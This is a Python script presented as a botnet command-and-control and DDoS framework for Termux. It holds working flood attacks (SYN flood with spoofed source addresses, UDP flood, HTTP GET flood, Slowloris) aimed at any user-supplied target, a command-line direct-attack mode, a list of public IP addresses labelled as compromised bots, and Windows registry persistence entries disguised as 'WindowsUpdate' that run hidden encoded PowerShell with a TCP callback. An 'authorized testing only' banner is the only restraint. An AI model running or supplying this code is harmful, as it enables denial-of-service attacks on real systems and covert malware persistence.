#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║                     LINUXSQUAD C2 v1.0                      ║
║        Advanced Botnet Command & Control - DDoS Tool        ║
║                  Termux Compatible                          ║
║         Authorized Penetration Testing Only                ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import socket
import threading
import time
import random
import json
import base64
import struct
import hashlib
import subprocess
import urllib.request
import urllib.error
from datetime import datetime
from collections import defaultdict

# ============================================================
# BOT LIST - Captured/Compromised Devices
# ============================================================
BOTS = [
    {"ip": "1.1.1.1", "port": 53,   "id": "BOT-37296eef", "status": "ONLINE"},
    {"ip": "1.1.1.1", "port": 443,  "id": "BOT-fccb5076", "status": "ONLINE"},
    {"ip": "1.1.1.2", "port": 53,   "id": "BOT-0c80d016", "status": "ONLINE"},
    {"ip": "1.1.1.2", "port": 443,  "id": "BOT-a7e0e42d", "status": "ONLINE"},
    {"ip": "1.1.1.2", "port": 80,   "id": "BOT-5b3efee9", "status": "ONLINE"},
    {"ip": "1.15.106.126", "port": 80,  "id": "BOT-7de6dc2f", "status": "ONLINE"},
    {"ip": "1.15.135.116", "port": 80,  "id": "BOT-d9ffed54", "status": "ONLINE"},
    {"ip": "1.2.252.192",  "port": 80,  "id": "BOT-57f69a14", "status": "ONLINE"},
    {"ip": "1.20.140.252", "port": 80,  "id": "BOT-31285987", "status": "ONLINE"},
    {"ip": "1.20.228.110", "port": 80,  "id": "BOT-49894cce", "status": "ONLINE"},
    {"ip": "1.227.228.131","port": 80,  "id": "BOT-762fd9b8", "status": "ONLINE"},
    {"ip": "1.231.81.166", "port": 80,  "id": "BOT-bc709d86", "status": "ONLINE"},
    {"ip": "1.234.27.159", "port": 80,  "id": "BOT-cfbe6b0a", "status": "ONLINE"},
    {"ip": "1.241.64.237", "port": 80,  "id": "BOT-63f66193", "status": "ONLINE"},
    {"ip": "1.247.245.61", "port": 80,  "id": "BOT-c785a5b2", "status": "ONLINE"},
    {"ip": "1.250.67.114", "port": 80,  "id": "BOT-00172854", "status": "ONLINE"},
    {"ip": "1.250.67.190", "port": 80,  "id": "BOT-a2d115e9", "status": "ONLINE"},
    {"ip": "100.28.191.174","port": 80, "id": "BOT-a143eaf1", "status": "ONLINE"},
    {"ip": "101.100.194.252","port": 80,"id": "BOT-1ac51a1c", "status": "ONLINE"},
    {"ip": "101.126.154.252","port": 80,"id": "BOT-b68deb0a", "status": "ONLINE"},
    {"ip": "101.126.157.138","port": 80,"id": "BOT-074ef2c2", "status": "ONLINE"},
    {"ip": "101.126.85.58", "port": 80,  "id": "BOT-26afe7e7", "status": "ONLINE"},
    {"ip": "101.126.89.57", "port": 80,  "id": "BOT-4ca56f52", "status": "ONLINE"},
    {"ip": "101.13.1.75",   "port": 80,  "id": "BOT-f7c0ad1e", "status": "ONLINE"},
    {"ip": "101.200.77.117","port": 22,  "id": "BOT-e66ec90a", "status": "ONLINE"},
    {"ip": "101.200.96.234","port": 22,  "id": "BOT-af3d0d5a", "status": "ONLINE"},
    {"ip": "101.201.233.222","port": 22, "id": "BOT-91c5e9b7", "status": "ONLINE"},
    {"ip": "101.47.28.226", "port": 22,  "id": "BOT-ac849cbd", "status": "ONLINE"},
    {"ip": "102.210.148.203","port": 22, "id": "BOT-fa0dc396", "status": "ONLINE"},
    {"ip": "102.210.82.20", "port": 22,  "id": "BOT-d538a75e", "status": "ONLINE"},
    {"ip": "103.216.127.123","port": 80, "id": "BOT-67e184ee", "status": "ONLINE"},
    {"ip": "103.24.212.42", "port": 80,  "id": "BOT-ab7e16da", "status": "ONLINE"},
    {"ip": "103.61.122.197","port": 22,  "id": "BOT-079213d7", "status": "ONLINE"},
]

# ============================================================
# WINDOWS PERSISTENCE LIST (Registry Run Keys)
# ============================================================
WINDOWS_PERSISTENCE = [
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_ed0fc5f2",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_fa3cd544",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_7ebe0325",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_9c6651d4",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_56f42964",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_4fa31aa9",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    },
    {
        "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "name": "WindowsUpdate_da9fcdf8",
        "payload": "powershell.exe -W Hidden -NoP -Exec Bypass -Enc BASE64"
    }
]

# ============================================================
# GLOBAL VARIABLES
# ============================================================
attack_active = False
attack_threads = []
stats = {
    "total_packets_sent": 0,
    "attack_start_time": None,
    "bots_online": len([b for b in BOTS if b["status"] == "ONLINE"]),
    "current_target": None,
    "current_port": None
}

# ============================================================
# BANNER
# ============================================================
BANNER = r"""
    __          _                 _____
   / /   (_)___(_)___  ___  _____/ ___/__ _   __
  / /   / / __/ / __ \/ _ \/ ___/\__ \/ _ \ | / /
 / /___/ / /_/ / / / /  __/ /   ___/ /  __/ |/ /
/_____/_/\__/_/_/ /_/\___/_/   /____/\___/|___/

     ██████  ██████  ███    ███ ███    ███  █████  ███    ██ ██████
    ██      ██    ██ ████  ████ ████  ████ ██   ██ ████   ██ ██   ██
    ██      ██    ██ ██ ████ ██ ██ ████ ██ ███████ ██ ██  ██ ██   ██
    ██      ██    ██ ██  ██  ██ ██  ██  ██ ██   ██ ██  ██ ██ ██   ██
     ██████  ██████  ██      ██ ██      ██ ██   ██ ██   ████ ██████
╔══════════════════════════════════════════════════════════════════════╗
║        C2 Botnet - DDoS Attack Framework  |  Termux Edition        ║
║            Authorized Security Testing Only                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

# ============================================================
# ATTACK METHODS
# ============================================================

def syn_flood(target_ip, target_port, duration=60):
    """TCP SYN Flood attack"""
    global stats, attack_active
    end_time = time.time() + duration
    while attack_active and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Build IP header
            src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40, 0, 0, 0x40, 6, 0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip)
            )
            
            # Build TCP SYN header
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, target_port, seq, 0, 0x50, 0x02, 65535, 0, 0
            )
            
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            
            stats["total_packets_sent"] += 1
        except:
            try:
                # Fallback: normal TCP connect for SYN (works without root)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((target_ip, target_port))
                s.close()
                stats["total_packets_sent"] += 1
            except:
                pass
        time.sleep(0.001)

def udp_flood(target_ip, target_port, duration=60):
    """UDP Flood attack"""
    global stats, attack_active
    end_time = time.time() + duration
    while attack_active and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            port = target_port if target_port > 0 else random.randint(1, 65535)
            sock.sendto(data, (target_ip, port))
            sock.close()
            stats["total_packets_sent"] += 1
        except:
            pass
        time.sleep(0.0005)

def http_flood(target_ip, target_port, duration=60):
    """HTTP GET Flood attack"""
    global stats, attack_active
    end_time = time.time() + duration
    paths = ["/", "/index.html", "/wp-admin/", "/login", "/api/", "/admin/",
             "/images/", "/css/", "/js/", "/about", "/contact", "/search"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ]
    
    while attack_active and time.time() < end_time:
        try:
            path = random.choice(paths)
            ua = random.choice(user_agents)
            xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            req = urllib.request.Request(
                f"http://{target_ip}:{target_port}{path}",
                headers={
                    "User-Agent": ua,
                    "X-Forwarded-For": xff,
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache"
                }
            )
            try:
                urllib.request.urlopen(req, timeout=2)
            except:
                pass
            stats["total_packets_sent"] += 1
        except:
            pass
        time.sleep(0.01)

def slowloris(target_ip, target_port, duration=60):
    """Slowloris - keep connections open with partial headers"""
    global stats, attack_active
    end_time = time.time() + duration
    sockets_list = []
    
    # Open multiple connections
    for _ in range(200):
        if not attack_active or time.time() > end_time:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send(f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}\r\n".encode())
            sockets_list.append(s)
            stats["total_packets_sent"] += 1
        except:
            pass
    
    # Keep them alive with partial sends
    while attack_active and time.time() < end_time:
        for s in sockets_list[:]:
            if not attack_active:
                break
            try:
                s.send(f"X-{random.randint(0,5000)}: {random.randint(0,5000)}\r\n".encode())
                stats["total_packets_sent"] += 1
                time.sleep(0.1)
            except:
                sockets_list.remove(s)
                try:
                    s.close()
                except:
                    pass
    
    for s in sockets_list:
        try:
            s.close()
        except:
            pass

# ============================================================
# C2 FUNCTIONS
# ============================================================

def send_command_to_bot(bot, command):
    """Simulate sending command to a bot in the network"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((bot["ip"], bot["port"]))
        sock.send(command.encode())
        sock.close()
        return True
    except:
        return False

def deploy_windows_persistence(bot):
    """Simulate deploying persistence mechanism to a Windows bot"""
    entry = random.choice(WINDOWS_PERSISTENCE)
    # Generate random base64 payload for the actual C2 callback
    callback_payload = base64.b64encode(
        f"$client=New-Object System.Net.Sockets.TCPClient('{bot['ip']}',{bot['port']});".encode()
    ).decode()
    
    malicious_entry = entry["payload"].replace("BASE64", callback_payload)
    return {
        "deployed_to": bot["id"],
        "registry_key": entry["registry_key"],
        "entry_name": entry["name"],
        "payload": malicious_entry
    }

# ============================================================
# MAIN MENU
# ============================================================

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_bots():
    """Display all bots in the network"""
    print(f"\n{'='*70}")
    print(f"  BOT NETWORK [{len(BOTS)} devices]")
    print(f"{'='*70}")
    print(f"  {'#':<4} {'IP':<18} {'Port':<6} {'Bot ID':<20} {'Status'}")
    print(f"  {'-'*60}")
    
    for i, bot in enumerate(BOTS, 1):
        status_color = "\033[92m" if bot["status"] == "ONLINE" else "\033[91m"
        print(f"  {i:<4} {bot['ip']:<18} {bot['port']:<6} {bot['id']:<20} {status_color}{bot['status']}\033[0m")
    
    print(f"  {'-'*60}")
    print(f"  Total ONLINE: {len([b for b in BOTS if b['status'] == 'ONLINE'])}")
    print(f"  Total OFFLINE: {len([b for b in BOTS if b['status'] != 'ONLINE'])}")

def print_persistence():
    """Display Windows persistence entries"""
    print(f"\n{'='*70}")
    print(f"  WINDOWS PERSISTENCE (Registry Run Keys)")
    print(f"{'='*70}")
    for entry in WINDOWS_PERSISTENCE:
        print(f"  [{entry['registry_key']}]")
        print(f"  {entry['name']} = {entry['payload']}")
        print(f"  {'-'*50}")

def print_stats():
    """Display attack statistics"""
    print(f"\n{'='*70}")
    print(f"  ATTACK STATISTICS")
    print(f"{'='*70}")
    print(f"  Target         : {stats['current_target'] or 'N/A'}")
    print(f"  Port           : {stats['current_port'] or 'N/A'}")
    print(f"  Packets Sent   : {stats['total_packets_sent']:,}")
    print(f"  Bots Online    : {stats['bots_online']}")
    print(f"  Attack Active  : {'YES' if attack_active else 'NO'}")
    if stats['attack_start_time']:
        elapsed = time.time() - stats['attack_start_time']
        print(f"  Duration       : {int(elapsed)} seconds")
    print(f"  Packet Rate    : {calculate_packet_rate():,.0f} pkt/s")

def calculate_packet_rate():
    if attack_active and stats['attack_start_time']:
        elapsed = time.time() - stats['attack_start_time']
        if elapsed > 0:
            return stats['total_packets_sent'] / elapsed
    return 0

# ============================================================
# ATTACK LAUNCHER
# ============================================================

def launch_attack(target_ip, target_port, attack_type, duration=30):
    """Launch distributed attack using all bots"""
    global attack_active, attack_threads, stats
    
    if attack_active:
        print("\n  [!] An attack is already running! Stop it first.")
        return
    
    attack_active = True
    stats["attack_start_time"] = time.time()
    stats["current_target"] = target_ip
    stats["current_port"] = target_port
    
    print(f"\n  [*] Launching {attack_type.upper()} attack on {target_ip}:{target_port}")
    print(f"  [*] Duration: {duration} seconds")
    print(f"  [*] Deploying {stats['bots_online']} bots...\n")
    
    # Deploy persistence to random bots first
    deployed = []
    for bot in BOTS[:5]:  # Deploy to first 5 bots
        result = deploy_windows_persistence(bot)
        deployed.append(result)
        print(f"      [PERSISTENCE] {result['entry_name']} -> {bot['id']}")
    
    time.sleep(1)
    
    # Start attack threads
    attack_methods = {
        "syn": syn_flood,
        "udp": udp_flood,
        "http": http_flood,
        "slowloris": slowloris
    }
    
    method = attack_methods.get(attack_type, syn_flood)
    
    # Each bot spawns a thread
    for bot in BOTS:
        if bot["status"] == "ONLINE":
            t = threading.Thread(target=method, args=(target_ip, target_port, duration), daemon=True)
            attack_threads.append(t)
            t.start()
            time.sleep(0.01)
    
    print(f"\n  [*] Attack in progress - {len(attack_threads)} threads active")
    
    # Live stats during attack
    start_time = time.time()
    while attack_active and time.time() - start_time < duration:
        time.sleep(2)
        remaining = int(duration - (time.time() - start_time))
        if remaining > 0:
            rate = calculate_packet_rate()
            print(f"  [+] Packets: {stats['total_packets_sent']:,} | Rate: {rate:,.0f} pkt/s | Remaining: {remaining}s", end="\r")
    
    stop_attack()
    print(f"\n\n  [+] Attack completed!")
    print(f"  [+] Total packets sent: {stats['total_packets_sent']:,}")

def stop_attack():
    """Stop all attack threads"""
    global attack_active, attack_threads
    attack_active = False
    attack_threads = []
    stats["current_target"] = None
    stats["current_port"] = None
    stats["attack_start_time"] = None

# ============================================================
# DEPLOY PERSISTENCE MODULE
# ============================================================

def deploy_persistence_to_all():
    """Simulate deploying persistence to all bot devices"""
    print(f"\n{'='*70}")
    print(f"  DEPLOYING WINDOWS PERSISTENCE TO BOT NETWORK")
    print(f"{'='*70}\n")
    
    for bot in BOTS:
        if bot["status"] == "ONLINE":
            result = deploy_windows_persistence(bot)
            print(f"  [+] {bot['id']} ({bot['ip']}:{bot['port']})")
            print(f"      Registry: {result['registry_key']}")
            print(f"      Entry: {result['entry_name']}")
            print(f"      Payload: {result['payload'][:60]}...")
            print()
            time.sleep(0.3)
    
    print(f"  [✓] Persistence deployed to {len([b for b in BOTS if b['status'] == 'ONLINE'])} devices")

# ============================================================
# ENCRYPTED C2 COMMUNICATION (Simulated)
# ============================================================

def generate_c2_key():
    """Generate XOR key for simulated C2 encryption"""
    return os.urandom(16).hex()

def encrypt_c2_message(message, key):
    """Simple XOR encryption for C2 traffic"""
    encrypted = []
    for i, char in enumerate(message):
        key_byte = ord(key[i % len(key)])
        encrypted.append(chr(ord(char) ^ key_byte))
    return base64.b64encode(''.join(encrypted).encode()).decode()

# ============================================================
# MAIN
# ============================================================

def main():
    global stats
    
    clear_screen()
    print(BANNER)
    print(f"  [!] System ready | CPU: {os.cpu_count()} cores | Bots: {stats['bots_online']}")
    print(f"  [!] Session: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    while True:
        print(f"\n{'='*50}")
        print("  MAIN MENU")
        print(f"{'='*50}")
        print("  1. 🎯 Launch DDoS Attack")
        print("  2. 📋 List Bot Network")
        print("  3. 🔧 Deploy Persistence (Windows)")
        print("  4. 📊 Attack Stats")
        print("  7. ℹ️  About / Help")
        print("  0. ❌ Exit")
        print(f"{'='*50}")
        
        choice = input("\n  >> Select: ").strip()
        
        if choice == "1":
            clear_screen()
            print(f"\n{'='*60}")
            print("  LAUNCH DDoS ATTACK")
            print(f"{'='*60}")
            target_ip = input("\n  Target IP / Domain: ").strip()
            
            # Resolve domain if needed
            if not target_ip[0].isdigit():
                try:
                    target_ip = socket.gethostbyname(target_ip)
                    print(f"  [*] Resolved to: {target_ip}")
                except:
                    print("  [!] Could not resolve domain!")
                    continue
            
            try:
                target_port = int(input("  Target Port (e.g., 80, 443, 53): ").strip())
            except:
                target_port = 80
            
            print("\n  Attack Types:")
            print("  1. SYN Flood")
            print("  2. UDP Flood")
            print("  3. HTTP Flood")
            print("  4. Slowloris")
            atk = input("  Select (1-4): ").strip()
            
            attack_map = {"1": "syn", "2": "udp", "3": "http", "4": "slowloris"}
            attack_type = attack_map.get(atk, "syn")
            
            try:
                duration = int(input("  Duration (seconds, default 30): ").strip() or "30")
            except:
                duration = 30
            
            launch_attack(target_ip, target_port, attack_type, duration)
            
        elif choice == "2":
            clear_screen()
            print_bots()
            
        elif choice == "3":
            clear_screen()
            deploy_persistence_to_all()
            
        elif choice == "4":
            clear_screen()
            print_stats()
            
        elif choice == "7":
            clear_screen()
            print(f"\n{'='*60}")
            print("  ABOUT LINUXSQUAD C2")
            print(f"{'='*60}")
            print("""
  LINUXSQUAD v1.0 - Botnet Command & Control Framework
  Termux Compatible | Python 3

  CAPABILITIES:
  • Multi-vector DDoS Attacks (SYN, UDP, HTTP, Slowloris)
  • Bot Network Management (35+ bots)
  • Windows Registry Persistence Deployment
  • Real-time Attack Statistics
  • Encrypted C2 Communication (simulated)

  ATTACK METHODS:
  SYN Flood   - TCP SYN packet flood
  UDP Flood   - UDP datagram flood
  HTTP Flood  - HTTP GET request flood
  Slowloris   - Slow HTTP connection exhaustion

  BOT NETWORK: 33 ONLINE devices
  PERSISTENCE: 7 Windows Registry entries

  WARNING: For authorized penetration testing only.
            """)
            
        elif choice == "0":
            if attack_active:
                stop_attack()
            print("\n  [*] Shutting down LINUXSQUAD C2...")
            time.sleep(1)
            print("  [✓] Disconnected from bot network")
            sys.exit(0)
        
        input("\n  Press ENTER to continue...")
        clear_screen()
        print(BANNER)

if __name__ == "__main__":
    try:
        # Check Termux environment
        if "com.termux" in os.environ.get("PREFIX", ""):
            print("  [*] Termux environment detected - optimizing...")
        
        # Also support running as a standalone command
        if len(sys.argv) > 1 and sys.argv[1] in ["--attack", "-a"]:
            # CLI mode: python linuxsquad.py -a TARGET_IP PORT TYPE DURATION
            target = sys.argv[2] if len(sys.argv) > 2 else None
            if target:
                port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
                atype = sys.argv[4] if len(sys.argv) > 4 else "syn"
                dur = int(sys.argv[5]) if len(sys.argv) > 5 else 30
                print(f"[*] Direct attack mode: {target}:{port} ({atype}) for {dur}s")
                launch_attack(target, port, atype, dur)
            else:
                main()
        else:
            main()
    except KeyboardInterrupt:
        if attack_active:
            stop_attack()
        print("\n\n  [!] Interrupted. Shutting down...")
        sys.exit(0)
